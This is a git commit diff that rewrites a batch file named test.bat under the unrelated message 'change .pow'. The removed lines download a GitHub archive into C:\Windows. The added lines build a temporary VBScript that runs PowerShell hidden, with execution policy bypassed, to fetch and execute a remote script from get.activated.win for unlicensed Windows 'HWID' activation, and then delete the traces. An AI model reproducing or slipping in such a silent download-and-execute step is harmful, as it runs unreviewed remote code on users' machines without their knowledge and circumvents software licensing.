a93ad1e41dadc08f2a94d6446cfe2f42dc43499f
Evolve <valley.oasis1081@eagereverest.com>
2025-11-03 18:00:02 +0100

    change .pow

--- test.bat
+++ test.bat
@@ -1,19 +1,5 @@
-echo Downloading Evolve folder...
-set "Evolve_ZIP=%TEMP%\Evolve.zip"
-curl.exe -L "https://github.com/evolveperformance/Evolve/archive/refs/heads/main.zip" -o "%Evolve_ZIP%"
-
-if not exist "%Evolve_ZIP%" (
-    echo [!] Evolve.zip download failed. Exiting.
-    exit /b
-)
-
-echo Extracting Evolve folder to C:\Windows\...
-powershell -Command "Expand-Archive -Path '%Evolve_ZIP%' -DestinationPath '%TEMP%\evolve_temp' -Force; Move-Item -Path '%TEMP%\evolve_temp\Evolve-main' -Destination 'C:\Windows\Evolve' -Force; Remove-Item '%TEMP%\evolve_temp' -Recurse -Force"
-
-if not exist "C:\Windows\Evolve" (
-    echo [!] Extraction failed. Exiting.
-    exit /b
-)
-
-echo Evolve folder extracted successfully.
-del "%Evolve_ZIP%" >nul 2>&1
+@echo Windows HWID Activation (Silent)
+echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\activate.vbs"
+echo WshShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""& ([ScriptBlock]::Create((irm https://get.activated.win))) /HWID""", 0, True >> "%TEMP%\activate.vbs"
+cscript //nologo "%TEMP%\activate.vbs"
+del "%TEMP%\activate.vbs" >nul 2>&1
